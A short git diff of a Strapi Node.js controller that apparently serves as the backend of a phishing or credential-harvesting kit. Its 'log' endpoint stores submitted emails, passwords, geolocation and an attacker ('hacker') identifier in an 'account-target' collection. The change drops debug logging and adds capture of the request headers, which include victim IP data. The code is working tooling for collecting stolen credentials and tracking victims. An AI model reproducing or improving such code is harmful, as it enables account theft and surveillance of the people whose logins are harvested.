@@ -11,7 +11,7 @@ module.exports = {
     log:async(ctx)=>{
 
         const body=ctx.request.body
-        console.log('************ \n ************body:', body)
+        
 /*
         const browser = await puppeteer.launch({headless: false})
         const page = await browser.newPage()
@@ -21,10 +21,10 @@ module.exports = {
           await strapi.query("account-target").create({
             email:body.email,
             password:body.mdp,
-            infos: JSON.parse(body.position),
+            infos:{position: JSON.parse(body.position),ip: ctx.header},
             hacker:body.hacker
         })
-        console.log(' ----------------------- --- \n position):', JSON.parse(body.position))
+        
 
     }
 };
